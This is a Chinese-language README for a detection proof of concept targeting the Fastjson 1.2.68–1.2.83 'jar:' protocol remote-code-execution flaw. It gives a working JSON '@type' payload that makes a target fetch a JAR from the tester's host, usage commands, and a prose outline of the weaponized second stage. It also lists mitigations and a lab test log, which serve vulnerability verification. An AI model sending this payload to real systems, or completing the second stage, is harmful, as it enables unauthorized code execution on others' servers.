# Fastjson 1.2.68 ~ 1.2.83 jar: 协议远程代码执行（无 CVE 编号）

| 项 | 内容 |
|---|---|
| CVE | 无（阿里 fastjson2 wiki 安全公告，未分配 CVE） |
| 产品 / 版本 | Fastjson `1.2.68` ~ `1.2.83`（含 1.2.83） |
| 漏洞类型 | `RCE`（`jar:` 协议绕过 + `@JSONType` 注解探测） |
| 危害 | 未授权远程代码执行（autoType 默认关闭时仍可触发） |
| 前置条件 | 目标为 Spring Boot（URLClassLoader 支持远程 JAR）；未开启 `safeMode` |
| 验证方式 | 托管探测 HTTP 服务，观察目标是否拉取 JAR |
| 破坏性 | 无：不提供可执行类、不落地文件、不执行命令 |

## 与 CVE-2022-25845 的区别

CVE-2022-25845 针对的是 1.2.83 **之前**版本的另一条 autoType 路径；本条是 1.2.83 上仍然存在的 `jar:` 协议绕过，**没有 CVE 编号**，唯一有效缓解是开启 `safeMode`。两者不要混为一谈。

## 漏洞描述

fastjson 在 `checkAutoType` 中校验类名之前，会先对 `@type` 做 `@JSONType` 注解探测：对 `<typeName>.class` 调用 `getResourceAsStream`。当 `@type` 是一个 `jar:http://...` 形式的 URL 时，JVM 会按 URL 去下载远程 JAR；Spring Boot 的 `URLClassLoader` 会真正执行这个远程拉取。

JAR 中带 `@JSONType` 注解的类无需开启 autoType 即可通过校验并被实例化，其静态初始化块随即执行——这就是代码执行点。

## 两个工程约束

1. **点号会被替换**：fastjson 构造资源路径时把 `.` 换成 `/`，所以点分 IP 会被拆成路径。攻击者改用**无点的十进制整数 IP**（如 `10.0.0.15` → `167772175`）。
2. **`//` 无法直接定义类**：`jar:http://` 类名里含 `//`，JDK 拒绝在 Tomcat 请求线程上直接 `defineClass`。完整利用需要两阶段——先让目标下载并缓存 JAR 到 `/proc/self/fd/N`，再用 `jar:file:/proc/self/fd/N!/POC`（全单斜杠）喷洒 N 直到命中。

**本脚本只做第一阶段**，即「目标是否来下载我们托管的 JAR」。这一步足以证明漏洞代码路径被执行，且不需要投放任何可执行类。

## 验证原理

1. 本机起一个 HTTP 服务（`--lport`，默认 18081），记录所有 GET 请求
2. 向目标 POST：

```json
{"user": {"@type": "jar:http://<十进制IP>:<端口>/probe!/POC"}}
```

3. 只要收到 `/probe` 请求，就说明目标执行了 `jar:` 拉取，漏洞成立
4. 目标此时通常返回 `400 autoType is not support`——这是预期，因为下载副作用已经发生

## 使用方法

```bash
# 最简（自动探测本机 IP 并转十进制）
python3 poc.py -u http://target:8090/

# 推荐：显式指定能被目标访问的 IP
python3 poc.py -u http://10.0.0.13:8090/ --lhost 10.0.0.11

# 端口冲突时换端口
python3 poc.py -u http://target:8090/ --lhost 10.0.0.11 --lport 18082
```

| 参数 | 说明 | 默认 |
|---|---|---|
| `-u/--url` | 目标地址（必填） | — |
| `--lhost` | 目标可访问的本机 IP（自动转十进制） | 自动探测 |
| `--lport` | 本地 HTTP 端口 | 18081 |
| `-t/--timeout` | 请求超时（秒） | 8 |
| `-w/--wait` | 等待下载的秒数 | 6 |
| `-k/--insecure` | 跳过 TLS 校验 | 关闭 |

退出码：`0` 存在 / `1` 不存在 / `2` 参数或网络错误。

## 预期输出

```text
[目标]    http://10.0.0.13:8090/
[注入点]  JSON 请求体 user.@type (jar: 协议触发 @JSONType 注解探测)
[Payload] {"user": {"@type": "jar:http://167772175:18081/probe!/POC"}}
[监听]    0.0.0.0:18081 (十进制 IP 167772175 = 10.0.0.15)
[响应]    HTTP 400, body: {..."message":"JSON parse error: autoType is not support..."
[下载]    收到 38 次请求, 路径: /probe
[结论]    VULNERABLE - Fastjson 1.2.68~1.2.83 jar: 协议 RCE (无 CVE 编号)
```

目标内部的 fastjson 会对同一个类名重试多次，所以经常看到几十次 `/probe`，属正常现象。

## 为什么不做第二阶段

第二阶段（`/proc/self/fd` 喷洒）需要投递一个带 `@JSONType` 注解、静态块可执行命令的 JAR，本质是武器化载荷。本仓库定位是 PoC 验证，只证明「目标会拉取攻击者指定的 JAR」，不提供可执行类，也不执行任何命令。

## 修复建议

- **开启 safeMode**（唯一有效）：`ParserConfig.getGlobalInstance().setSafeMode(true)`
- 升级到 fastjson 2.x（该 `jar:` 探测逻辑已重构）
- WAF 层拦截请求体中出现 `jar:` / `@type` 的可疑 JSON
- 限制应用出站访问，阻断到非白名单地址的 HTTP 下载

## 参考链接

- Vulhub 环境：https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.83-rce
- 官方公告：https://github.com/alibaba/fastjson2/wiki/Security-Advisory:-Remote-Code-Execution-in-fastjson-1.2.68%E2%80%931.2.83
- 研究文章：https://fearsoff.org/research/fastjson-1-2-83-rce

## 验证记录

| 日期 | 环境 | 结果 |
|---|---|---|
| 2026-10-24 | vulhub `1283-rce-web-1`（镜像 `vulhub/fastjson:1.2.83`），`10.0.0.13:8090` | VULNERABLE，收到 38 次 `/probe` 下载，退出码 0 |
| 2026-10-24 | 本地 JSON 回显服务（阴性对照） | NOT VULNERABLE，无下载，退出码 1 |
| 2026-10-24 | 不可达端口 `10.0.0.13:9` | ERROR，退出码 2 |
